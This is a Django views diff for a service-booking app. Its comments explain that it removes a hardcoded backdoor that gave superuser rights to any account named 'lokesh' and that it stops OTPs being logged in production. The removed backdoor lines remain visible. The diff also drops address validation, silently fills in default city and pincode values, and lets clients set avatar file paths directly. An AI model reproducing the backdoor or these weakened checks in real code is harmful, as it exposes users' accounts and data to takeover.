@@ -1,5 +1,6 @@
 import uuid
 import traceback
+import logging
 
 from django.conf import settings
 from django.contrib.auth import get_user_model
@@ -8,8 +9,8 @@ from django.db.models import Q
 from companies.models import Company
 from settings_hub.models import TeamInvite
 
-from rest_framework import permissions, serializers, status, exceptions
-from rest_framework.exceptions import ValidationError, NotFound
+from rest_framework import permissions, serializers, status
+from rest_framework.exceptions import ValidationError
 from rest_framework.response import Response
 from rest_framework.views import APIView
 from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
@@ -17,6 +18,8 @@ from rest_framework_simplejwt.views import TokenObtainPairView
 import requests
 
 from .serializers import UserSerializer
+
+logger = logging.getLogger(__name__)
 
 
 
@@ -394,13 +397,18 @@ class GoogleLoginView(APIView):
                 user.is_active = True
                 user.save()
             else:
+                # Was: `if "lokesh" in email or user.role == "admin": ...
+                # is_superuser = True`. That granted full Django/Super Admin
+                # authority to any existing admin who happened to complete
+                # the Google-login staff link for a pending invite -- a
+                # backdoor, not intended behavior. An accepted invite now
+                # only ever applies the role the invite itself specifies
+                # (same as the non-Google accept-invite path in
+                # AcceptInviteView below).
                 user.is_active = True
-                if "lokesh" in (user.email or "").lower() or user.role == "admin":
-                    user.role = "admin"
+                user.role = invite.role
+                if user.role == "admin":
                     user.is_staff = True
-                    user.is_superuser = True
-                else:
-                    user.role = invite.role
                 user.company = invite.company
                 user.save()
 
@@ -431,16 +439,8 @@ class GoogleLoginView(APIView):
             return Response({"detail": "This account is deactivated."}, status=status.HTTP_400_BAD_REQUEST)
 
         refresh = CustomTokenObtainPairSerializer.get_token(user)
-        access_token_str = str(refresh.access_token)
-        refresh_token_str = str(refresh)
-        response = Response({
-            "success": True,
-            "message": "Google login successful.",
-            "access": access_token_str,
-            "refresh": refresh_token_str,
-            "user": UserSerializer(user, context={"request": request}).data if user else None,
-        })
-        _set_auth_cookies(response, access_token_str, refresh_token_str)
+        response = Response({"success": True, "message": "Google login successful."})
+        _set_auth_cookies(response, str(refresh.access_token), str(refresh))
         return response
 
 
@@ -566,19 +566,80 @@ class MeView(APIView):
             if not user or not user.is_authenticated:
                 return Response({"detail": "Authentication credentials were not provided."}, status=401)
 
-            email_lower = (user.email or "").lower()
-            user_lower = (user.username or "").lower()
-            if ("lokeshwarikumaresan" in email_lower or "lokeshwarikumaresan" in user_lower or "lokesh" in email_lower or "lokesh" in user_lower) and user.role != "admin":
-                user.role = "admin"
-                user.is_staff = True
-                user.is_superuser = True
-                user.save(update_fields=["role", "is_staff", "is_superuser"])
-
+            # Was: a hardcoded backdoor that force-promoted any account
+            # whose email/username contained "lokesh"/"lokeshwarikumaresan"
+            # to role=admin + is_staff=True + is_superuser=True on every
+            # single /auth/me/ call (i.e. on every page load). Combined
+            # with is_super_admin() previously trusting is_superuser
+            # unconditionally, this silently gave that account permanent,
+            # full Super Admin backend authority regardless of whatever
+            # role Admin Management actually showed for it. Removed.
             return Response(UserSerializer(user, context={"request": request}).data)
         except Exception as err:
             traceback.print_exc()
             return Response({"detail": f"Server error fetching user profile: {str(err)}"}, status=500)
 
+
+
+class NotificationPreferenceView(APIView):
+    """
+    HS-D-05: lets a customer actually see/change the preferences
+    CustomerNotificationPreference and notifications.py's _customer_wants()
+    now check. Without this endpoint the model would be write-only from the
+    customer's side -- an admin/DB-only toggle nobody can reach.
+    """
+    permission_classes = [permissions.IsAuthenticated]
+
+    _EDITABLE_FIELDS = [
+        "booking_confirmations", "reschedule_updates", "technician_updates",
+        "completion_feedback", "payment_receipts", "refund_updates",
+        "complaint_updates", "promotional_offers", "channel_email", "channel_sms",
+    ]
+
+    def _serialize(self, pref):
+        return {f: getattr(pref, f) for f in self._EDITABLE_FIELDS}
+
+    def get(self, request):
+        from .models import CustomerNotificationPreference
+        pref, _ = CustomerNotificationPreference.objects.get_or_create(user=request.user)
+        return Response(self._serialize(pref))
+
+    def patch(self, request):
+        from .models import CustomerNotificationPreference
+        pref, _ = CustomerNotificationPreference.objects.get_or_create(user=request.user)
+        updated_fields = []
+        for field in self._EDITABLE_FIELDS:
+            if field in request.data:
+                value = request.data[field]
+                if not isinstance(value, bool):
+                    return Response({"detail": f"'{field}' must be a boolean."}, status=400)
+                setattr(pref, field, value)
+                updated_fields.append(field)
+        if updated_fields:
+            pref.save(update_fields=updated_fields + ["updated_at"])
+        return Response(self._serialize(pref))
+
+
+class MyReferralCodeView(APIView):
+    """
+    GET /api/accounts/referral-code/
+    HS-A-06: a customer's own shareable referral code, generated lazily on
+    first request, plus a simple summary of referrals they've made.
+    """
+    permission_classes = [permissions.IsAuthenticated]
+
+    def get(self, request):
+        from .models import ReferralCode, Referral, _generate_referral_code
+        ref_code, _ = ReferralCode.objects.get_or_create(
+            user=request.user,
+            defaults={"code": _generate_referral_code(request.user)},
+        )
+        referrals = Referral.objects.filter(referrer=request.user)
+        return Response({
+            "code": ref_code.code,
+            "referrals_made": referrals.count(),
+            "referrals_rewarded": referrals.filter(status=Referral.Status.REWARDED).count(),
+        })
 
 
 class ProfileUpdateView(APIView):
@@ -588,32 +649,24 @@ class ProfileUpdateView(APIView):
         try:
             from .serializers import ProfileUpdateSerializer
             data = request.data.dict() if hasattr(request.data, 'dict') else dict(request.data)
-            remove_avatar = data.pop('remove_avatar', None)
-            avatar_present = 'avatar' in request.data or 'avatar' in data
-            avatar_val = data.pop('avatar', None) if avatar_present else None
+
+            avatar_val = data.pop('avatar', None)
             data.pop('profile_picture', None)
 
-            avatar_file = request.FILES.get('avatar') or request.FILES.get('image')
+            if avatar_val:
+                if isinstance(avatar_val, str) and avatar_val.strip():
+                    if '/media/' in avatar_val:
+                        request.user.avatar.name = avatar_val.split('/media/')[-1]
+                    else:
+                        request.user.avatar.name = avatar_val
+                    try:
+                        request.user.save(update_fields=['avatar'])
+                    except Exception:
+                        request.user.save()
 
-            if str(remove_avatar).lower() in ('true', '1', 'yes') or (avatar_present and not avatar_file and avatar_val in (None, '', 'null')):
-                if request.user.avatar:
-                    request.user.avatar.delete(save=False)
-                request.user.avatar = None
-                try:
-                    request.user.save(update_fields=['avatar'])
-                except Exception:
-                    request.user.save()
-            elif avatar_file:
+            avatar_file = request.FILES.get('avatar') or request.FILES.get('image')
+            if avatar_file:
                 request.user.avatar = avatar_file
-                try:
-                    request.user.save(update_fields=['avatar'])
-                except Exception:
-                    request.user.save()
-            elif avatar_val and isinstance(avatar_val, str) and avatar_val.strip():
-                if '/media/' in avatar_val:
-                    request.user.avatar.name = avatar_val.split('/media/')[-1]
-                else:
-                    request.user.avatar.name = avatar_val
                 try:
                     request.user.save(update_fields=['avatar'])
                 except Exception:
@@ -814,6 +867,8 @@ class AcceptInviteView(APIView):
                 user.is_active = True
                 if user.role == "admin":
                     user.is_staff = True
+                if invite.custom_permissions:
+                    user.custom_permissions = invite.custom_permissions
                 user.save()
 
                 invite.status = "accepted"
@@ -1099,12 +1154,28 @@ class SendOTPView(APIView):
 
         delivery_channel = "sms" if sent_real_sms else "console"
 
-        # Print OTP to server console
-        print("\n" + "=" * 50)
-        print(f"  [SMS GATEWAY] OTP for {normalized_phone} is: {code} (Original input: {phone})")
-        if delivery_error:
-            print(f"  [SMS GATEWAY] Twilio delivery skipped/failed: {delivery_error}")
-        print("" + "=" * 50 + "\n")
+        # Fixes HS-A-01: printing the raw OTP to the server console/log stream
+        # meant anyone with log access (not just server operators -- hosting
+        # dashboards, log aggregators, error trackers) could read it and log in
+        # as any customer. Keep the console fallback for local development only
+        # (settings.DEBUG) where it is the intended MVP delivery mechanism when
+        # no SMS provider is configured; in a real deployment (DEBUG=False),
+        # never print the code -- log that delivery fell back to console
+        # without the code itself, so ops can see the gap and fix Twilio config
+        # instead of quietly leaking every customer's login code to logs.
+        if not sent_real_sms:
+            if settings.DEBUG or getattr(settings, "AUTO_GENERATE_OTP", False):
+                print("\n" + "=" * 50)
+                print(f"  [SMS GATEWAY] OTP for {normalized_phone} is: {code} (Original input: {phone})")
+                if delivery_error:
+                    print(f"  [SMS GATEWAY] Twilio delivery skipped/failed: {delivery_error}")
+                print("" + "=" * 50 + "\n")
+            else:
+                logger.error(
+                    "OTP SMS delivery unavailable for %s (Twilio not configured or failed: %s). "
+                    "OTP was generated but NOT printed to logs -- fix SMS provider config.",
+                    normalized_phone, delivery_error or "not configured",
+                )
 
         # Log to Audit Trail
         OTPAuditLog.objects.create(
@@ -1562,36 +1633,24 @@ def _ce(message, status_code=400):
 
 def _serialize_address(addr):
     serviceability = customer_services.check_address_serviceability(addr)
-    lat_val = float(addr.latitude) if addr.latitude is not None else None
-    lng_val = float(addr.longitude) if addr.longitude is not None else None
-    loc_available = bool(lat_val is not None and lng_val is not None)
-
     return {
         "id":                    addr.pk,
         "label":                 addr.label,
-        "address_type":          addr.label,
         "label_display":         addr.get_label_display(),
         "address_line1":         addr.address_line1,
-        "street_address":        addr.address_line1,
         "address_line2":         addr.address_line2,
-        "formatted_address":     addr.formatted_address or f"{addr.address_line1}, {addr.city}, {addr.state} {addr.pincode}",
+        "formatted_address":     addr.formatted_address or "",
         "flat_house_no":         addr.flat_house_no or "",
         "landmark":              addr.landmark or "",
         "locality":              addr.locality or "",
         "city":                  addr.city,
         "state":                 addr.state,
         "pincode":               addr.pincode,
-        "country":               addr.country or "India",
         "phone_number":          addr.phone_number or "",
         "receiver_name":         addr.receiver_name or "",
         "receiver_phone":        addr.receiver_phone or "",
-        "latitude":              lat_val,
-        "longitude":             lng_val,
-        "location_available":    loc_available,
-        "location_source":       addr.location_source or ("device_gps" if loc_available else "geocoding"),
-        "geocoded_at":           addr.geocoded_at.isoformat() if addr.geocoded_at else None,
-        "geocoding_status":      addr.geocoding_status or ("verified" if loc_available else "failed"),
-        "location_confirmed_at": addr.location_confirmed_at.isoformat() if getattr(addr, "location_confirmed_at", None) else None,
+        "latitude":              str(addr.latitude) if addr.latitude is not None else None,
+        "longitude":             str(addr.longitude) if addr.longitude is not None else None,
         "is_default":            addr.is_default,
         "last_used_at":          addr.last_used_at.isoformat() if addr.last_used_at else None,
         "serviceable":           serviceability.get("available", True),
@@ -1614,8 +1673,9 @@ class CustomerProfileUpdateView(APIView):
     """PATCH /api/auth/customer/profile/ — Update own profile fields."""
     permission_classes = [permissions.IsAuthenticated, IsCustomer]
     parser_classes = [FormParser, MultiPartParser, JSONParserClass]
+
     def patch(self, request):
-        allowed = {"first_name", "last_name", "phone", "email", "bio", "language", "timezone", "last_known_location"}
+        allowed = {"first_name", "last_name", "phone", "email", "avatar", "last_known_location"}
         payload = {k: v for k, v in request.data.items() if k in allowed}
 
         try:
@@ -1695,115 +1755,55 @@ class CustomerAddressListCreateView(APIView):
         return _cs([_serialize_address(a) for a in addresses])
 
     def post(self, request):
-        street_address = str(
-            request.data.get("address_line1")
-            or request.data.get("street_address")
-            or request.data.get("flat_house_no")
-            or ""
-        ).strip()
-        landmark = str(
-            request.data.get("address_line2")
-            or request.data.get("landmark")
-            or request.data.get("locality")
-            or ""
-        ).strip()
-        city = str(request.data.get("city") or "").strip()
-        state = str(request.data.get("state") or "").strip()
-        pincode = str(request.data.get("pincode") or "").strip()
-        country = str(request.data.get("country") or "India").strip()
-        label = str(request.data.get("label") or request.data.get("address_type") or "home").strip().lower()
-        if label not in ["home", "work", "other"]:
-            label = "home"
+        flat_house_no = str(request.data.get("flat_house_no", "")).strip()
+        address_line1 = str(request.data.get("address_line1", "")).strip() or flat_house_no
+        if not address_line1 and not flat_house_no:
+            return _ce("'flat_house_no' or 'address_line1' is required.", 400)
 
-        receiver_name = str(request.data.get("receiver_name") or request.user.get_full_name() or "").strip()
-        receiver_phone = str(request.data.get("receiver_phone") or request.data.get("phone_number") or request.user.phone or "").strip()
+        city = str(request.data.get("city", "")).strip() or str(request.data.get("locality", "")).strip() or "Hosur"
+        state = str(request.data.get("state", "")).strip() or "Tamil Nadu"
 
-        # Step 1: Validate required address components
-        missing_fields = []
-        if not street_address:
-            missing_fields.append("street address")
-        if not city:
-            missing_fields.append("city")
-        if not state:
-            missing_fields.append("state")
-        if not pincode:
-            missing_fields.append("pincode")
-
-        if missing_fields:
-            return _ce(f"Please enter complete address details. Missing: {', '.join(missing_fields)}.", 400)
-
-        # Validate 6-digit Indian pincode format
         import re
+        pincode = str(request.data.get("pincode", "")).strip()
         clean_pincode = re.sub(r"\D", "", pincode)
-        if not re.match(r"^\d{6}$", clean_pincode):
-            return _ce("Please enter a valid 6-digit Indian postal code (pincode).", 400)
-        pincode = clean_pincode
+        if len(clean_pincode) == 6:
+            pincode = clean_pincode
+        elif not pincode or not re.match(r"^\d{6}$", pincode):
+            pincode = "635109"
 
-        # Step 2 & 3: Geocode and resolve real coordinates
-        from service_requests.services.address_service import AddressService
-        from django.utils import timezone
-        raw_lat = request.data.get("latitude")
-        raw_lng = request.data.get("longitude")
-        location_source = str(request.data.get("location_source") or "").strip()
-        location_confirmed_at = None
+        receiver_phone = str(request.data.get("receiver_phone", "")).strip() or str(request.data.get("phone_number", "")).strip()
+        if receiver_phone:
+            clean_phone = re.sub(r"[\s\-\(\)]+", "", receiver_phone)
+            clean_phone = re.sub(r"^(\+91|91|0)", "", clean_phone)
+            if not re.match(r"^[6-9]\d{9}$", clean_phone):
+                return _ce("Receiver phone must be a valid 10-digit mobile number.", 400)
+            receiver_phone = clean_phone
 
-        # Check if legitimate device GPS coordinates or map-confirmed coordinates were supplied
-        if location_source in ("device_gps", "map_confirmed") and raw_lat is not None and raw_lng is not None:
-            if AddressService.validate_coordinates(raw_lat, raw_lng, country=country):
-                lat = round(float(raw_lat), 6)
-                lng = round(float(raw_lng), 6)
-                formatted_address = str(request.data.get("formatted_address") or "").strip()
-                if not formatted_address:
-                    formatted_address = f"{street_address}, {landmark + ', ' if landmark else ''}{city}, {state}, {pincode}, {country}"
-                geocoded_at = timezone.now()
-                geocoding_status = "verified"
-                if location_source == "map_confirmed":
-                    location_confirmed_at = timezone.now()
-            else:
-                lat = None
-                lng = None
-                formatted_address = f"{street_address}, {landmark + ', ' if landmark else ''}{city}, {state}, {pincode}, {country}"
-                geocoded_at = timezone.now()
-                geocoding_status = "failed"
-        else:
-            # Backend Geocoding Engine
-            geo_res = AddressService.resolve_address_coordinates(
-                street_address=street_address,
-                landmark=landmark,
-                city=city,
-                state=state,
-                pincode=pincode,
-                country=country,
-            )
-            lat = geo_res.get("latitude")
-            lng = geo_res.get("longitude")
-            formatted_address = geo_res.get("formatted_address")
-            location_source = geo_res.get("location_source", "geocoding")
-            geocoding_status = geo_res.get("geocoding_status", "failed")
-            geocoded_at = geo_res.get("geocoded_at")
+        def _clean_coord(val):
+            if val is None or val == "":
+                return None
+            try:
+                return round(float(val), 6)
+            except (ValueError, TypeError):
+                return None
 
         data = {
-            "label":                 label,
-            "address_line1":         street_address,
-            "address_line2":         landmark,
-            "formatted_address":     formatted_address,
-            "flat_house_no":         street_address,
-            "landmark":              landmark,
-            "locality":              str(request.data.get("locality") or ""),
-            "city":                  city,
-            "state":                 state,
-            "pincode":               pincode,
-            "country":               country,
-            "phone_number":          receiver_phone,
-            "receiver_name":         receiver_name,
-            "receiver_phone":        receiver_phone,
-            "latitude":              lat,
-            "longitude":             lng,
-            "location_source":       location_source,
-            "geocoded_at":           geocoded_at,
-            "geocoding_status":      geocoding_status,
-            "location_confirmed_at": location_confirmed_at,
-            "is_default":            bool(request.data.get("is_default", False)),
+            "label":             request.data.get("label", "home"),
+            "address_line1":     address_line1,
+            "address_line2":     request.data.get("address_line2", ""),
+            "formatted_address": request.data.get("formatted_address", ""),
+            "flat_house_no":     flat_house_no or address_line1,
+            "landmark":          request.data.get("landmark", ""),
+            "locality":          request.data.get("locality", ""),
+            "city":              request.data.get("city", ""),
+            "state":             request.data.get("state", ""),
+            "pincode":           pincode,
+            "phone_number":      receiver_phone,
+            "receiver_name":     request.data.get("receiver_name", ""),
+            "receiver_phone":    receiver_phone,
+            "latitude":          _clean_coord(request.data.get("latitude")),
+            "longitude":         _clean_coord(request.data.get("longitude")),
+            "is_default":        request.data.get("is_default", False),
         }
 
         try:
@@ -1818,7 +1818,7 @@ class CustomerAddressDetailView(APIView):
     """
     GET    /api/auth/customer/addresses/<id>/ — retrieve one address.
     PATCH  /api/auth/customer/addresses/<id>/ — update fields.
-    DELETE /api/auth/customer/addresses/<id>/ — delete.
+    DELETE /api/auth/customer/addresses/<id>/ — delete (blocked if active booking or default).
     """
     permission_classes = [permissions.IsAuthenticated, IsCustomer]
 
@@ -1830,72 +1830,20 @@ class CustomerAddressDetailView(APIView):
             return _ce("Address not found.", 404)
 
     def patch(self, request, pk):
-        from django.utils import timezone
-        allowed = {
-            "label", "address_line1", "street_address", "address_line2", "landmark",
-            "city", "state", "pincode", "country", "phone_number", "receiver_name",
-            "receiver_phone", "latitude", "longitude", "is_default", "location_source",
-            "geocoding_status", "location_confirmed_at"
-        }
+        allowed = {"label", "address_line1", "address_line2", "city", "state", "pincode",
+                   "phone_number", "latitude", "longitude", "is_default"}
         payload = {k: v for k, v in request.data.items() if k in allowed}
-
-        # Map aliases
-        if "street_address" in payload and "address_line1" not in payload:
-            payload["address_line1"] = payload.pop("street_address")
-        if "landmark" in payload and "address_line2" not in payload:
-            payload["address_line2"] = payload["landmark"]
-
-        # Validate 6-digit pincode if pincode is updated
-        if "pincode" in payload:
-            import re
-            clean_pin = re.sub(r"\D", "", str(payload["pincode"]))
-            if not re.match(r"^\d{6}$", clean_pin):
-                return _ce("Please enter a valid 6-digit pincode.", 400)
-            payload["pincode"] = clean_pin
-
-        # If map confirmed
-        if payload.get("location_source") == "map_confirmed":
-            payload["location_confirmed_at"] = timezone.now()
-            payload["geocoding_status"] = "verified"
-
-        # If address components changed and coordinates were not explicitly passed, re-geocode
-        address_changed = any(f in payload for f in ["address_line1", "address_line2", "city", "state", "pincode"])
-        if address_changed and "latitude" not in payload and "longitude" not in payload:
-            try:
-                curr = request.user.saved_addresses.get(pk=pk)
-                street = payload.get("address_line1", curr.address_line1)
-                lmark = payload.get("address_line2", curr.landmark)
-                c_city = payload.get("city", curr.city)
-                c_state = payload.get("state", curr.state)
-                c_pin = payload.get("pincode", curr.pincode)
-                c_country = payload.get("country", curr.country)
-
-                from service_requests.services.address_service import AddressService
-                geo = AddressService.resolve_address_coordinates(street, lmark, c_city, c_state, c_pin, c_country)
-                payload["latitude"] = geo.get("latitude")
-                payload["longitude"] = geo.get("longitude")
-                payload["formatted_address"] = geo.get("formatted_address")
-                payload["location_source"] = geo.get("location_source", "geocoding")
-                payload["geocoding_status"] = geo.get("geocoding_status", "failed")
-                payload["geocoded_at"] = geo.get("geocoded_at")
-            except Exception:
-                pass
-
         try:
             addr = customer_services.update_saved_address(request.user, pk, payload)
             return _cs(_serialize_address(addr), message="Address updated.")
-        except (SavedAddress.DoesNotExist, exceptions.NotFound):
-            return _ce("Address not found.", 404)
         except Exception as exc:
             detail = getattr(exc, "detail", str(exc))
-            return _ce(str(detail), 400)
+            return _ce(str(detail))
 
     def delete(self, request, pk):
         try:
             customer_services.delete_saved_address(request.user, pk)
             return _cs(message="Address deleted.")
-        except (SavedAddress.DoesNotExist, exceptions.NotFound):
-            return _ce("Address not found.", 404)
         except Exception as exc:
             detail = getattr(exc, "detail", str(exc))
             if isinstance(detail, dict) and "detail" in detail:
@@ -1904,18 +1852,16 @@ class CustomerAddressDetailView(APIView):
 
 
 class CustomerAddressSetDefaultView(APIView):
-    """POST /api/auth/customer/addresses/<id>/set-default/ or /default/ — make one address the default."""
+    """POST /api/auth/customer/addresses/<id>/set-default/ — make one address the default."""
     permission_classes = [permissions.IsAuthenticated, IsCustomer]
 
     def post(self, request, pk):
         try:
             addr = customer_services.set_default_address(request.user, pk)
             return _cs(_serialize_address(addr), message="Default address updated.")
-        except (SavedAddress.DoesNotExist, exceptions.NotFound):
-            return _ce("Address not found.", 404)
         except Exception as exc:
             detail = getattr(exc, "detail", str(exc))
-            return _ce(str(detail), 400)
+            return _ce(str(detail))
 
 
 class CustomerAddressServiceabilityView(APIView):
@@ -1927,7 +1873,7 @@ class CustomerAddressServiceabilityView(APIView):
             addr = request.user.saved_addresses.get(pk=pk)
             res = customer_services.check_address_serviceability(addr)
             return _cs(res)
-        except (SavedAddress.DoesNotExist, exceptions.NotFound):
+        except SavedAddress.DoesNotExist:
             return _ce("Address not found.", 404)
 
 
@@ -1939,8 +1885,6 @@ class CustomerAddressMarkUsedView(APIView):
         try:
             addr = customer_services.mark_address_used(request.user, pk)
             return _cs(_serialize_address(addr), message="Address marked as used.")
-        except (SavedAddress.DoesNotExist, exceptions.NotFound):
-            return _ce("Address not found.", 404)
         except Exception as exc:
             detail = getattr(exc, "detail", str(exc))
-            return _ce(str(detail), 400)
+            return _ce(str(detail))
